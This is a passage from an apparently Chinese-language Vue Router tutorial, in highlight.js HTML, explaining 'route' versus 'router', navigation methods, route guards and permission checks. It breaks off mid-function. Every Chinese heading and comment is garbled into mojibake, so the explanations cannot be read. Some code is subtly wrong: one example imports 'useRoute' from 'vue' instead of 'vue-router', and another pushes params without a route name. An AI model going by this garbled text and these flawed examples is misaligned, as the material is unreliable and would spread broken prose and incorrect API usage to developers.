    { <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/:id/profile'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Profile</span>, <span class="hljs-attr">meta</span>: { ... } }
  ],
  
  <span class="hljs-comment">// è·¯ç”±åç§°</span>
  <span class="hljs-attr">name</span>: <span class="hljs-string">'UserProfile'</span>,
  
  <span class="hljs-comment">// é‡å®šå‘çš„æ¥æºï¼ˆå¦‚æœæœ‰ï¼‰</span>
  <span class="hljs-attr">redirectedFrom</span>: <span class="hljs-literal">undefined</span>
}

<span class="hljs-comment">// router å¯¹è±¡çš„ç»“æ„ï¼ˆä¸»è¦æ–¹æ³•ï¼‰</span>
<span class="hljs-keyword">const</span> router = {
  <span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•</span>
  <span class="hljs-title function_">push</span>(),        <span class="hljs-comment">// å¯¼èˆªåˆ°æ–°è·¯ç”±</span>
  <span class="hljs-title function_">replace</span>(),     <span class="hljs-comment">// æ›¿æ¢å½“å‰è·¯ç”±</span>
  <span class="hljs-title function_">go</span>(),          <span class="hljs-comment">// å‰è¿›/åé€€</span>
  <span class="hljs-title function_">back</span>(),        <span class="hljs-comment">// åé€€</span>
  <span class="hljs-title function_">forward</span>(),     <span class="hljs-comment">// å‰è¿›</span>
  
  <span class="hljs-comment">// è·¯ç”±ä¿¡æ¯</span>
  currentRoute,  <span class="hljs-comment">// å½“å‰è·¯ç”±ï¼ˆç›¸å½“äºrouteï¼‰</span>
  options,       <span class="hljs-comment">// è·¯ç”±é…ç½®</span>
  
  <span class="hljs-comment">// å®ˆå«ç›¸å…³</span>
  <span class="hljs-title function_">beforeEach</span>(),
  <span class="hljs-title function_">beforeResolve</span>(),
  <span class="hljs-title function_">afterEach</span>(),
  
  <span class="hljs-comment">// å…¶ä»–</span>
  <span class="hljs-title function_">addRoute</span>(),    <span class="hljs-comment">// åŠ¨æ€æ·»åŠ è·¯ç”±</span>
  <span class="hljs-title function_">removeRoute</span>(), <span class="hljs-comment">// ç§»é™¤è·¯ç”±</span>
  <span class="hljs-title function_">hasRoute</span>(),    <span class="hljs-comment">// æ£€æŸ¥è·¯ç”±æ˜¯å¦å­˜åœ¨</span>
  <span class="hljs-title function_">getRoutes</span>(),   <span class="hljs-comment">// è·å–æ‰€æœ‰è·¯ç”±</span>
  <span class="hljs-title function_">isReady</span>()      <span class="hljs-comment">// æ£€æŸ¥è·¯ç”±æ˜¯å¦å°±ç»ª</span>
}
</code></pre>
<h3 data-id="heading-6">å››ã€routeï¼šæ·±å…¥äº†è§£å½“å‰è·¯ç”±ä¿¡æ¯</h3>
<h4 data-id="heading-7">4.1 ä¸»è¦å±æ€§è¯¦è§£</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è·å–å®Œæ•´ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()

<span class="hljs-comment">// 1. è·¯å¾„ç›¸å…³</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'path:'</span>, route.<span class="hljs-property">path</span>)        <span class="hljs-comment">// "/user/123"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'fullPath:'</span>, route.<span class="hljs-property">fullPath</span>) <span class="hljs-comment">// "/user/123?name=john#about"</span>

<span class="hljs-comment">// 2. å‚æ•°ç›¸å…³ï¼ˆæœ€å¸¸ç”¨ï¼ï¼‰</span>
<span class="hljs-comment">// paramsï¼šè·¯å¾„å‚æ•°ï¼ˆå¿…é€‰å‚æ•°ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'params:'</span>, route.<span class="hljs-property">params</span>)    <span class="hljs-comment">// { id: '123', slug: 'vue-guide' }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'id:'</span>, route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)     <span class="hljs-comment">// "123"</span>

<span class="hljs-comment">// queryï¼šæŸ¥è¯¢å‚æ•°ï¼ˆå¯é€‰å‚æ•°ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'query:'</span>, route.<span class="hljs-property">query</span>)      <span class="hljs-comment">// { page: '2', sort: 'desc' }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'page:'</span>, route.<span class="hljs-property">query</span>.<span class="hljs-property">page</span>)  <span class="hljs-comment">// "2"</span>

<span class="hljs-comment">// hashï¼šå“ˆå¸Œå€¼</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hash:'</span>, route.<span class="hljs-property">hash</span>)        <span class="hljs-comment">// "#section-1"</span>

<span class="hljs-comment">// 3. å…ƒä¿¡æ¯ï¼ˆmetaï¼‰</span>
<span class="hljs-comment">// è·¯ç”±é…ç½®ä¸­çš„ meta å­—æ®µ</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/admin'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Admin</span>,
    <span class="hljs-attr">meta</span>: {
      <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">permissions</span>: [<span class="hljs-string">'admin'</span>],
      <span class="hljs-attr">breadcrumb</span>: <span class="hljs-string">'ç®¡ç†åå°'</span>
    }
  }
]

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">if</span> (route.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresAuth</span>) {
  <span class="hljs-comment">// éœ€è¦è®¤è¯</span>
}

<span class="hljs-comment">// 4. åŒ¹é…çš„è·¯ç”±è®°å½•</span>
route.<span class="hljs-property">matched</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">record</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'åŒ¹é…çš„è·¯ç”±:'</span>, record.<span class="hljs-property">path</span>)
  <span class="hljs-comment">// å¯ä»¥è®¿é—®åµŒå¥—è·¯ç”±çš„ meta</span>
  <span class="hljs-keyword">if</span> (record.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresAuth</span>) {
    <span class="hljs-comment">// æ‰€æœ‰åŒ¹é…çš„è·¯ç”±éƒ½éœ€è¦è®¤è¯</span>
  }
})

<span class="hljs-comment">// 5. åç§°å’Œæ¥æº</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'name:'</span>, route.<span class="hljs-property">name</span>)            <span class="hljs-comment">// "UserProfile"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'redirectedFrom:'</span>, route.<span class="hljs-property">redirectedFrom</span>) <span class="hljs-comment">// é‡å®šå‘æ¥æº</span>
</code></pre>
<h4 data-id="heading-8">4.2 å®é™…ä½¿ç”¨åœºæ™¯</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;!-- åœºæ™¯1ï¼šæ ¹æ®å‚æ•°æ˜¾ç¤ºå†…å®¹ --&gt;
  &lt;div v-if="route.params.id"&gt;
    ç”¨æˆ·ID: {{ route.params.id }}
  &lt;/div&gt;
  
  &lt;!-- åœºæ™¯2ï¼šæ ¹æ®queryæ˜¾ç¤ºä¸åŒæ ‡ç­¾ --&gt;
  &lt;div v-if="route.query.tab === 'profile'"&gt;
    æ˜¾ç¤ºä¸ªäººèµ„æ–™
  &lt;/div&gt;
  &lt;div v-else-if="route.query.tab === 'settings'"&gt;
    æ˜¾ç¤ºè®¾ç½®
  &lt;/div&gt;
  
  &lt;!-- åœºæ™¯3ï¼šåŠ¨æ€æ ‡é¢˜ --&gt;
  &lt;title&gt;{{ pageTitle }}&lt;/title&gt;
&lt;/template&gt;

&lt;script&gt;
import { useRoute, computed } from 'vue'

export default {
  setup() {
    const route = useRoute()
    
    // åŠ¨æ€æ ‡é¢˜
    const pageTitle = computed(() =&gt; {
      const baseTitle = 'æˆ‘çš„åº”ç”¨'
      if (route.meta.title) {
        return `${route.meta.title} - ${baseTitle}`
      }
      return baseTitle
    })
    
    // æƒé™æ£€æŸ¥
    const hasPermission = computed(() =&gt; {
      const userRoles = ['user', 'editor']
      const requiredRoles = route.meta.roles || []
      return requiredRoles.some(role =&gt; userRoles.includes(role))
    })
    
    // é¢åŒ…å±‘å¯¼èˆª
    const breadcrumbs = computed(() =&gt; {
      return route.matched
        .filter(record =&gt; record.meta.breadcrumb)
        .map(record =&gt; ({
          title: record.meta.breadcrumb,
          path: record.path
        }))
    })
    
    return { route, pageTitle, hasPermission, breadcrumbs }
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-9">äº”ã€routerï¼šè·¯ç”±æ“ä½œå’Œæ§åˆ¶</h3>
<h4 data-id="heading-10">5.1 æ ¸å¿ƒæ–¹æ³•è¯¦è§£</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()

<span class="hljs-comment">// 1. ç¼–ç¨‹å¼å¯¼èˆª</span>
<span class="hljs-comment">// push - æ·»åŠ æ–°çš„å†å²è®°å½•</span>
router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/home'</span>)                      <span class="hljs-comment">// è·¯å¾„å­—ç¬¦ä¸²</span>
router.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">path</span>: <span class="hljs-string">'/home'</span> })            <span class="hljs-comment">// è·¯å¾„å¯¹è±¡</span>
router.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span> })             <span class="hljs-comment">// å‘½åè·¯ç”±</span>
router.<span class="hljs-title function_">push</span>({ 
  <span class="hljs-attr">name</span>: <span class="hljs-string">'User'</span>, 
  <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">123</span> }, 
  <span class="hljs-attr">query</span>: { <span class="hljs-attr">tab</span>: <span class="hljs-string">'profile'</span> },
  <span class="hljs-attr">hash</span>: <span class="hljs-string">'#section-2'</span>
})

<span class="hljs-comment">// replace - æ›¿æ¢å½“å‰å†å²è®°å½•ï¼ˆæ— è¿”å›ï¼‰</span>
router.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'/login'</span>)
router.<span class="hljs-title function_">replace</span>({ <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>, <span class="hljs-attr">query</span>: { <span class="hljs-attr">redirect</span>: route.<span class="hljs-property">fullPath</span> } })

<span class="hljs-comment">// go - åœ¨å†å²è®°å½•ä¸­å‰è¿›/åé€€</span>
router.<span class="hljs-title function_">go</span>(<span class="hljs-number">1</span>)    <span class="hljs-comment">// å‰è¿›1æ­¥</span>
router.<span class="hljs-title function_">go</span>(-<span class="hljs-number">1</span>)   <span class="hljs-comment">// åé€€1æ­¥</span>
router.<span class="hljs-title function_">go</span>(-<span class="hljs-number">3</span>)   <span class="hljs-comment">// åé€€3æ­¥</span>
router.<span class="hljs-title function_">go</span>(<span class="hljs-number">0</span>)    <span class="hljs-comment">// åˆ·æ–°å½“å‰é¡µé¢</span>

<span class="hljs-comment">// back/forward - ä¾¿æ·æ–¹æ³•</span>
router.<span class="hljs-title function_">back</span>()     <span class="hljs-comment">// åé€€ = router.go(-1)</span>
router.<span class="hljs-title function_">forward</span>()  <span class="hljs-comment">// å‰è¿› = router.go(1)</span>

<span class="hljs-comment">// 2. åŠ¨æ€è·¯ç”±ç®¡ç†</span>
<span class="hljs-comment">// æ·»åŠ è·¯ç”±ï¼ˆå¸¸ç”¨äºæƒé™è·¯ç”±ï¼‰</span>
router.<span class="hljs-title function_">addRoute</span>({
  <span class="hljs-attr">path</span>: <span class="hljs-string">'/admin'</span>,
  <span class="hljs-attr">component</span>: <span class="hljs-title class_">Admin</span>,
  <span class="hljs-attr">meta</span>: { <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">true</span> }
})

<span class="hljs-comment">// æ·»åŠ åµŒå¥—è·¯ç”±</span>
router.<span class="hljs-title function_">addRoute</span>(<span class="hljs-string">'Admin'</span>, {
  <span class="hljs-attr">path</span>: <span class="hljs-string">'users'</span>,
  <span class="hljs-attr">component</span>: <span class="hljs-title class_">AdminUsers</span>
})

<span class="hljs-comment">// ç§»é™¤è·¯ç”±</span>
router.<span class="hljs-title function_">removeRoute</span>(<span class="hljs-string">'admin'</span>) <span class="hljs-comment">// é€šè¿‡åç§°ç§»é™¤</span>

<span class="hljs-comment">// æ£€æŸ¥è·¯ç”±æ˜¯å¦å­˜åœ¨</span>
<span class="hljs-keyword">if</span> (router.<span class="hljs-title function_">hasRoute</span>(<span class="hljs-string">'admin'</span>)) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç®¡ç†å‘˜è·¯ç”±å·²å­˜åœ¨'</span>)
}

<span class="hljs-comment">// è·å–æ‰€æœ‰è·¯ç”±</span>
<span class="hljs-keyword">const</span> allRoutes = router.<span class="hljs-title function_">getRoutes</span>()
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ€»è·¯ç”±æ•°:'</span>, allRoutes.<span class="hljs-property">length</span>)

<span class="hljs-comment">// 3. è·¯ç”±å®ˆå«</span>
<span class="hljs-comment">// å…¨å±€å‰ç½®å®ˆå«</span>
router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresAuth</span> &amp;&amp; !<span class="hljs-title function_">isAuthenticated</span>()) {
    <span class="hljs-title function_">next</span>(<span class="hljs-string">'/login'</span>)
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">next</span>()
  }
})

<span class="hljs-comment">// å…¨å±€è§£æå®ˆå«</span>
router.<span class="hljs-title function_">beforeResolve</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
  <span class="hljs-comment">// æ‰€æœ‰ç»„ä»¶è§£æå®Œæˆåè°ƒç”¨</span>
})

<span class="hljs-comment">// å…¨å±€åç½®å®ˆå«</span>
router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
  <span class="hljs-comment">// è·¯ç”±è·³è½¬å®Œæˆåè°ƒç”¨</span>
  <span class="hljs-title function_">logPageView</span>(to.<span class="hljs-property">fullPath</span>)
})
</code></pre>
<h4 data-id="heading-11">5.2 å®é™…ä½¿ç”¨åœºæ™¯</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;!-- å¯¼èˆªæŒ‰é’® --&gt;
    &lt;button @click="goToHome"&gt;è¿”å›é¦–é¡µ&lt;/button&gt;
    &lt;button @click="goToUser(123)"&gt;æŸ¥çœ‹ç”¨æˆ·123&lt;/button&gt;
    &lt;button @click="openInNewTab"&gt;æ–°æ ‡ç­¾æ‰“å¼€&lt;/button&gt;
    &lt;button @click="goBack"&gt;è¿”å›ä¸Šä¸€æ­¥&lt;/button&gt;
    
    &lt;!-- æ¡ä»¶å¯¼èˆª --&gt;
    &lt;button v-if="canEdit" @click="editItem"&gt;ç¼–è¾‘&lt;/button&gt;
    
    &lt;!-- è·¯ç”±çŠ¶æ€ --&gt;
    &lt;p&gt;å½“å‰è·¯ç”±: {{ currentRoute.path }}&lt;/p&gt;
    &lt;button @click="checkRoutes"&gt;æ£€æŸ¥è·¯ç”±é…ç½®&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import { useRouter, useRoute } from 'vue-router'

export default {
  setup() {
    const router = useRouter()
    const route = useRoute()
    
    // 1. åŸºæœ¬å¯¼èˆª
    const goToHome = () =&gt; {
      router.push('/')
    }
    
    const goToUser = (userId) =&gt; {
      router.push({
        name: 'UserProfile',
        params: { id: userId },
        query: { tab: 'details' }
      })
    }
    
    const goBack = () =&gt; {
      if (window.history.length &gt; 1) {
        router.back()
      } else {
        router.push('/')
      }
    }
    
    // 2. æ¡ä»¶å¯¼èˆª
    const canEdit = computed(() =&gt; {
      return route.params.id &amp;&amp; userStore.canEdit(route.params.id)
    })
    
    const editItem = () =&gt; {
      router.push(`/edit/${route.params.id}`)
    }
    
    // 3. æ–°æ ‡ç­¾é¡µæ‰“å¼€
    const openInNewTab = () =&gt; {
      const routeData = router.resolve({
        name: 'UserProfile',
        params: { id: 123 }
      })
      window.open(routeData.href, '_blank')
    }
    
    // 4. åŠ¨æ€è·¯ç”±ç®¡ç†
    const addAdminRoute = () =&gt; {
      if (!router.hasRoute('admin')) {
        router.addRoute({
          path: '/admin',
          name: 'admin',
          component: () =&gt; import('./Admin.vue'),
          meta: { requiresAdmin: true }
        })
        console.log('ç®¡ç†å‘˜è·¯ç”±å·²æ·»åŠ ')
      }
    }
    
    // 5. è·¯ç”±çŠ¶æ€æ£€æŸ¥
    const checkRoutes = () =&gt; {
      console.log('å½“å‰è·¯ç”±:', router.currentRoute.value)
      console.log('æ‰€æœ‰è·¯ç”±:', router.getRoutes())
      console.log('è·¯ç”±é…ç½®:', router.options)
    }
    
    // 6. è·¯ç”±è·³è½¬æ‹¦æˆª
    const navigateWithConfirm = async (to) =&gt; {
      if (route.meta.hasUnsavedChanges) {
        const confirmed = await confirm('æœ‰æœªä¿å­˜çš„æ›´æ”¹ï¼Œç¡®å®šç¦»å¼€ï¼Ÿ')
        if (!confirmed) return
      }
      router.push(to)
    }
    
    // 7. è·å–è·¯ç”±ç»„ä»¶
    const getRouteComponent = () =&gt; {
      const matched = route.matched
      const component = matched[matched.length - 1]?.components?.default
      return component
    }
    
    return {
      currentRoute: router.currentRoute,
      goToHome,
      goToUser,
      goBack,
      canEdit,
      editItem,
      openInNewTab,
      addAdminRoute,
      checkRoutes,
      navigateWithConfirm
    }
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-12">å…­ã€å¸¸è§è¯¯åŒºä¸æ­£ç¡®ç”¨æ³•</h3>
<h4 data-id="heading-13">6.1 é”™è¯¯ vs æ­£ç¡®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šè¯•å›¾ä¿®æ”¹ route</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">$route</span>.<span class="hljs-property">params</span>.<span class="hljs-property">id</span> = <span class="hljs-number">456</span>  <span class="hljs-comment">// ä¸ä¼šç”Ÿæ•ˆï¼</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">$route</span>.<span class="hljs-property">query</span>.<span class="hljs-property">page</span> = <span class="hljs-string">'3'</span> <span class="hljs-comment">// ä¸ä¼šç”Ÿæ•ˆï¼</span>

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨ router è¿›è¡Œå¯¼èˆª</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">456</span> },
  <span class="hljs-attr">query</span>: { <span class="hljs-attr">page</span>: <span class="hljs-string">'3'</span> }
})

<span class="hljs-comment">// âŒ é”™è¯¯ï¼šæ··æ·†ä½¿ç”¨</span>
<span class="hljs-comment">// è¯•å›¾ç”¨ route è¿›è¡Œè·³è½¬</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">$route</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/home'</span>)  <span class="hljs-comment">// æŠ¥é”™ï¼route æ²¡æœ‰ push æ–¹æ³•</span>

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šåˆ†æ¸…èŒè´£</span>
<span class="hljs-keyword">const</span> id = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$route</span>.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>    <span class="hljs-comment">// è·å–ä¿¡æ¯ç”¨ route</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">`/user/<span class="hljs-subst">${id}</span>`</span>)    <span class="hljs-comment">// è·³è½¬ç”¨ router</span>

<span class="hljs-comment">// âŒ é”™è¯¯ï¼šç›´æ¥ä¿®æ”¹ URL</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'/new-page'</span>  <span class="hljs-comment">// ä¼šåˆ·æ–°é¡µé¢ï¼</span>

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨ router</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/new-page'</span>)      <span class="hljs-comment">// å•é¡µåº”ç”¨è·³è½¬</span>
</code></pre>
<h4 data-id="heading-14">6.2 å“åº”å¼å¤„ç†</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;!-- âŒ é”™è¯¯ï¼šç›´æ¥ç›‘å¬è·¯ç”±å¯¹è±¡ --&gt;
  &lt;!-- è¿™ç§æ–¹å¼å¯èƒ½ä¼šå¯¼è‡´æ— é™å¾ªç¯ --&gt;
  
  &lt;!-- âœ… æ­£ç¡®ï¼šä½¿ç”¨è®¡ç®—å±æ€§æˆ–ç›‘å¬å™¨ --&gt;
  &lt;div&gt;
    å½“å‰ç”¨æˆ·: {{ userId }}
    å½“å‰é¡µé¢: {{ currentPage }}
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  computed: {
    // âœ… æ­£ç¡®ï¼šä½¿ç”¨è®¡ç®—å±æ€§å“åº”å¼è·å–
    userId() {
      return this.$route.params.id || 'unknown'
    },
    currentPage() {
      return parseInt(this.$route.query.page) || 1
    }
  },
  
  watch: {
    // âœ… æ­£ç¡®ï¼šç›‘å¬ç‰¹å®šå‚æ•°å˜åŒ–
    '$route.params.id': {
      handler(newId) {
        if (newId) {
          this.loadUser(newId)
        }
      },
      immediate: true
    },
    
    // âœ… ç›‘å¬æ•´ä¸ªè·¯ç”±å˜åŒ–ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰
    $route(to, from) {
      // å¤„ç†è·¯ç”±å˜åŒ–é€»è¾‘
      this.trackPageView(to.path)
    }
  },
  
  // âœ… ä½¿ç”¨è·¯ç”±å®ˆå«
  beforeRouteUpdate(to, from, next) {
    // åœ¨åŒä¸€ç»„ä»¶å†…å“åº”è·¯ç”±å‚æ•°å˜åŒ–
    this.loadData(to.params.id)
    next()
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-15">ä¸ƒã€é«˜çº§åº”ç”¨åœºæ™¯</h3>
<h4 data-id="heading-16">7.1 è·¯ç”±å…ƒä¿¡æ¯å’Œæƒé™æ§åˆ¶</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è·¯ç”±é…ç½®</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span>,
    <span class="hljs-attr">meta</span>: { 
      <span class="hljs-attr">title</span>: <span class="hljs-string">'é¦–é¡µ'</span>,
      <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">false</span> 
    }
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/dashboard'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Dashboard</span>,
    <span class="hljs-attr">meta</span>: { 
      <span class="hljs-attr">title</span>: <span class="hljs-string">'æ§åˆ¶é¢æ¿'</span>,
      <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">permissions</span>: [<span class="hljs-string">'user'</span>]
    }
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/admin'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Admin</span>,
    <span class="hljs-attr">meta</span>: { 
      <span class="hljs-attr">title</span>: <span class="hljs-string">'ç®¡ç†å‘˜'</span>,
      <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">permissions</span>: [<span class="hljs-string">'admin'</span>],
      <span class="hljs-attr">breadcrumb</span>: <span class="hljs-string">'ç®¡ç†åå°'</span>
    },
    <span class="hljs-attr">children</span>: [
      {
        <span class="hljs-attr">path</span>: <span class="hljs-string">'users'</span>,
        <span class="hljs-attr">component</span>: <span class="hljs-title class_">AdminUsers</span>,
        <span class="hljs-attr">meta</span>: { 
          <span class="hljs-attr">title</span>: <span class="hljs-string">'ç”¨æˆ·ç®¡ç†'</span>,
          <span class="hljs-attr">breadcrumb</span>: <span class="hljs-string">'ç”¨æˆ·ç®¡ç†'</span>
        }
      }
    ]
  }
]

<span class="hljs-comment">// æƒé™æ§åˆ¶å®ˆå«</span>
router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> isAuthenticated = <span class="hljs-title function_">checkAuth</span>()
  <span class="hljs-keyword">const</span> userPermissions = <span class="hljs-title function_">getUserPermissions</span>()
  
  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦éœ€è¦è®¤è¯</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresAuth</span> &amp;&amp; !isAuthenticated) {
    <span class="hljs-title function_">next</span>({
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,
      <span class="hljs-attr">query</span>: { <span class="hljs-attr">redirect</span>: to.<span class="hljs-property">fullPath</span> }
    })
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-comment">// æ£€æŸ¥æƒé™</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">permissions</span>) {
    <span class="hljs-keyword">const</span> hasPermission = to.<span class="hljs-property">meta</span>.<span class="hljs-property">permissions</span>.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">perm</span> =&gt;</span> 
      userPermissions.<span class="hljs-title function_">includes</span>(perm)
    )
    
    <span class="hljs-keyword">if</span> (!hasPermission) {
      <span class="hljs-title function_">next</span>(<span class="hljs-string">'/403'</span>) <span class="hljs-comment">// æ— æƒé™é¡µé¢</span>
      <span class="hljs-keyword">return</span>
    }
  }
  
  <span class="hljs-title function_">next</span>()
})

<span class="hljs-comment">// ç»„ä»¶å†…ä½¿ç”¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()
    <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()
    
    <span class="hljs-comment">// æ£€æŸ¥å½“å‰è·¯ç”±æƒé™</span>
    <span class="hljs-keyword">const</span> canAccess = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (!route.<span class="hljs-property">meta</span>.<span class="hljs-property">permissions</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
      <span class="hljs-keyword">return</span> route.<span class="hljs-property">meta</span>.<span class="hljs-property">permissions</span>.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">perm</span> =&gt;</span> 
        userStore.<span class="hljs-property">permissions</span>.<span class="hljs-title function_">includes</span>(perm)
      )
    })
    
    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æƒé™ï¼Œé‡å®šå‘</span>
    <span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (!canAccess.<span class="hljs-property">value</span>) {
        router.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'/unauthorized'</span>)
      }
    })
    
    <span class="hljs-keyword">return</span> { canAccess }
  }
}
</code></pre>
<h4 data-id="heading-17">7.2 è·¯ç”±æ•°æ®é¢„å–</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨ router å’Œ route é…åˆæ•°æ®é¢„å–</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  routes,
  <span class="hljs-title function_">scrollBehavior</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, savedPosition</span>) {
    <span class="hljs-comment">// æ»šåŠ¨è¡Œä¸ºæ§åˆ¶</span>
    <span class="hljs-keyword">if</span> (savedPosition) {
      <span class="hljs-keyword">return</span> savedPosition
    }
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">top</span>: <span class="hljs-number">0</span> }
  }
})

<span class="hljs-comment">// ç»„ä»¶æ•°æ®é¢„å–</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">beforeRouteEnter</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) {
    <span class="hljs-comment">// åœ¨è¿›å…¥è·¯ç”±å‰è·å–æ•°æ®</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> userData = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUser</span>(to.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)
